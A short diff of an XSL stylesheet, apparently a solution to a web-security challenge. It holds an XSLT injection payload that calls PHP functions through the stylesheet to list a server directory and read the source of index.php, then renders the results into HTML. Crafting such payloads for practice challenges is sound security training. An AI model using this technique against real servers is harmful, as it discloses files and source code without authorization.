@@ -17,12 +17,9 @@
   	<xsl:template match="document">
 		<xsl:value-of select="user:output(string(filename),string(content))"/>
   	</xsl:template>
-
-
 <xsl:variable  name="scand"   select="php:functionString('scandir','/challenge/web-serveur/ch50')" />
 <xsl:variable  name="strscand" select="user:output('/challenge/web-serveur/ch50/index.php','$scand')" /> 
 <xsl:variable  name="header"  select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')"/>
-
 <div style="background-color:teal;color:white;padding:4px">
 <span style="font-weight:bold">
  DIR2 count:<xsl:value-of select="$strscand"/>     
